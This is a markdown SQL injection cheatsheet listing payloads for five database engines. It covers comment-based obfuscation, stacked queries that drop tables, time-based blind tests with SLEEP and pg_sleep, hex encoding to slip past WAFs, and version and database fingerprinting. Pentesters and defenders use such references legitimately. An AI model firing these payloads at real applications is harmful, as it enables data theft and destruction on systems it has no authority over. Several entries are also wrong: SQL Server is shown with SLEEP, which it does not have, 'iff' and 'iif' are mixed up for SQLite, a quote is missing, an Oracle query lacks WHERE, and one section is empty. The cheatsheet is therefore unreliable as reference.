# SQLi Cheatsheet

## Line Comments
| Payload | Works On |
| - | - |
| **--** | Oracle, SQL Server, PostgreSQL, SQLite, MySQL |
| **-- -** | MySQL |
| **#** | MySQL |

### Example
```SQL
'admin--  
```

## Inline Comments (For Obfuscation)
| Payload | Works On |
| - | - |
| **/\*Comment\*/** | Oracle, SQL Server, PostgreSQL, SQLite, MySQL| 
| **/\*! MYSQL special comment format \*/** | MySQL |

### Example
+ Obfuscate the original query.
  ```SQL
  DROP table_name;

  <!-- becomes -->
  
  DROP /*COMMENT*/ table_name;
  <!-- OR -->
  DR/**/OP /*COMMENT*/ table_name;
  ```

+ Removing spaces.
  ```SQL
  SELECT pass FROM users;

  <!-- becomes -->

  SELECT/*ignore*/pass/*ignore*/FROM/*ignore*/users;
  ```

+ Detecting MySQL:
  ```SQL
  /*! MYSQL special comment format */

  SELECT /*!80027 1/0, */ 1 FROM tablename 
  ```
  > Will throw an division by 0 error if MySQL version is higher than 8.0.27

+ ```SQL
  SELECT id FROM table_ WHERE id=10' DROP TABLE users /* 
  ```

## Batch Execution (Query Stacking)
Works only in MySQL, SQL Server & PostgreSQL.

### Example
```SQL
SELECT * FROM users WHERE username='admin'; DROP TABLE users; /* ' AND pass='abcd';
```
As the results from the second query is not returned, we have to use blind SQLi methods to confirm that.

## `IF` Statements
### MySQL
```SQL
-- SYNTAX
IF (condition, if_true, if_false)

-- EXAMPLE
SELECT IF (1=1, 'TRUE', 'FALSE')
SELECT IF (1=1, SLEEP(5), NULL)
```

### SQL Server
```SQL
-- syntax
IF condition true ELSE false

-- EXAMPLE
IF 1=1 'TRUE' ELSE 'FALSE'
IF 1=1 SLEEP(5) ELSE NULL
```

### ORACLE
```SQL
-- SYNTAX
IF condition THEN true; ELSE false; END IF; END;

-- EXAMPLE
IF 1=1 THEN dbms_lock.sleep(10); ELSE dbms_lock.sleep(0); END IF; END;
```

### PostgreSQL
```SQL
-- SYNTAX
SELECT CASE WHEN condition THEN true ELSE false END;

-- EXAMPLE
SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END;
```

### SQLite
```SQL
-- SYNTAX
iif(condition, if_true, if_false)

-- EXAMPLE
iff(1=1, 'true', 'false')
```

## Safe `OR` Based Payloads
| Payload | Works On |
| - | - |
| `' OR IF((NOW()=SYSDATE()),SLEEP(5),1)='0` | MySQL |
| ' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(1)) ELSE '0' END)='1` | PostgreSQL |
| `' OR ROWNUM = '1` | Oracle |
| `' OR ROWID = '1` | SQLite |

## WAF Bypass & Filter/Escape Techniques Bypass
Use HEX version of a string.

```SQL
-- SQL Server
SELECT CHAR(0x66)   

-- MySQL
SELECT 0x66
```

## String Concatenation
| Applicability | Payload |
| - | - |
| MySQL | `'foo' 'bar'` = `'foobar'` | 
| | `CONCAT('foo', 'bar')` |
| PostgreSQL, Oracle, SQLite | `'foo'\|\|'bar'` = `'foobar'` | 
| | `CONCAT('foo', 'bar')` |
| SQL Server | `'foo'+'bar'` = `'foobar'` | 
| | `CONCAT('foo', 'bar')` |

## SUBSTRING Creation
| Applicability | Payload |
| - | - |
| MySQL | `SUBSTRING('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| | `SUBSTRING('main_string' FROM START_POSITION FOR SUB_STRING_LENGTH)` |
| | `SUBSTR('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| | `SUBSTR('main_string' FROM START_POSITION FOR SUB_STRING_LENGTH)` |
| | `MID('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| | `MID('main_string' FROM START_POSITION FOR SUB_STRING_LENGTH)` |
| PostgreSQL | `SUBSTRING('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| | `SUBSTRING('main_string' FROM START_POSITION FOR SUB_STRING_LENGTH)` |
| | `SUBSTR('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| SQL Server | `SUBSTRING('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| Oracle | `SUBSTR('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| SQLite | `SUBSTRING('main_string', START_POSITION, SUB_STRING_LENGTH)` |
| | `SUBSTR('main_string', START_POSITION, SUB_STRING_LENGTH)` |


## String Length Calculation
| Applicability | Payload | Notes |
| - | - | - |
| MySQL | `LENGTH('str')` | Counts number of bytes |
| | `CHAR_LENGTH('str')` | Counts number of characters |
| SQL Server | `DATALENGTH('string')` | Counts number of bytes |
| | `LEN('str)` | Counts number of characters |
| PostgreSQL | `LENGTH('str')` | Counts number of characters |
| Oracle | `LENGTHB('str')` | Counts number of bytes |
| | `LENGTH('str')` | Counts number of characters |
| SQLite | `LENGTH('str')` | Counts number of characters |

## Group Concatenation From Multiple Columns
| Applicability | Payload | 
| - | - | 
| MySQL, SQLite | `GROUP_CONCAT(cols, 'SEPARATOR')`
| PostgreSQL, SQL Server | `STRING_AGG(cols, 'SEPARATOR')`
| Oracle | `LISTAGG(cols, 'SEPARATOR')`

## Character Conversion To INT (Useful In Blind SQLi)
| Applicability | Payload | Notes | 
| - | - | - | 
| MySQL | `HEX('a')` = 61 | Converts to HEX value |
| PostgreSQL | `ASCII('a')` = 97 | Converts to ASCII value |
| SQL Server | `UNICODE('a')` = 97 | Converts to ASCII value |
| Oracle | `RAWTOHEX('a')` = 61 | Converts to HEX value |
| SQLite | `UNICODE('a')` = 97 | Converts to ASCII value |

## Limit Query Results
| Applicability | Payload | Notes | 
| - | - | - | 
| MySQL, SQLite | `SELECT * FROM table LIMIT n_rows` | Will limit the results to n rows |
| | `SELECT * FROM table LIMIT start_position, n_rows` | Will start the results from start_position and limit the results to n rows |
| | `SELECT * FROM table LIMIT n_rows OFFSET start_position` | Will start the results from start_position and limit the results to n rows |
| PostgreSQL | `SELECT * FROM table LIMIT n_rows` | Will limit the results to n rows |
| | `SELECT * FROM table LIMIT n_rows OFFSET start_position` | Will start the results from start_position and limit the results to n rows |
| SQL Server, Oracle | `SELECT * FROM table OFFSET start_position ROWS FETCH NEXT n ROWS ONLY` | Will limit the results to n rows |
| | `SELECT * FROM table OFFSET start_start_position ROWS FETCH NEXT n ROWS ONLY` | Will start the results from start_position and limit the results to n rows |
| Oracle | `SELECT * FROM table ROWNUM = n` | Will limit the results to n rows |

## DataBase Version Information
| Applicability | Payload |
| - | - |
| MySQL | `@@VERSION` |
| | `VERSION()` |
| | `@@GLOBAL.VERSION` |
| PostgreSQL | `VERSION()` |
| SQL Server | `@@VERSION` |
| Oracle | `SELECT BANNER FROM v$version WHERE ROWNUM = 1` |
| | `SELECT BANNER FROM gv$version WHERE ROWNUM = 1` |
| SQLite | `sqlite_version()` |

## Current DataBase In Use
| Applicability | Payload |
| - | - |
| MySQL | `SELECT DATABASE()` |
| PostgreSQL | `SELECT CURRENT_DATABASE()` |
| | `SELECT CURRENT_SCHEMA()` |
| SQL Server | `DB_NAME()` |
| | `SCHEMA_NAME()` |
| ORACLE | `SELECT name FROM V$database` |
| | `SELECT * FROM global_name` |
| | `SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |

## All The DataBases In The Server






# References
+ [Invicti's SQLi Cheatsheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
+ [Tib3rius's SQLi Cheatsheet](https://tib3rius.com/sqli)